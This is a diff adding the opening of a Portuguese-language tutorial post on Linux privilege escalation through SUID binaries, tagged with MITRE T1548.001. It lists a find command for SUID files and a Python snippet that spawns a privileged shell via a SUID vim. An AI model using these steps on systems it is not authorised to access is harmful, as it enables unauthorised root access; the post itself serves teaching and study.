@@ -1,0 +1,28 @@
+---
+title: SUID Abuse — Escalando para root com binários esquecidos
+date: 2025-01-14
+category: privesc
+os: [linux]
+difficulty: medium
+mitre_tactic: TA0004
+mitre_technique: T1548.001
+tags: [suid, linux, privesc, gtfobins]
+status: published
+readingTime: 8
+---
+
+# Introdução
+
+Arquivos SUID são uma classe de arquivos no Linux construíd
+os com um bit especial. Quando executados...
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Se o `vim` possuir esse bit setado, é possível explorar:
+
+```python
+import os
+os.execl("/bin/sh", "sh", "-p")
+```
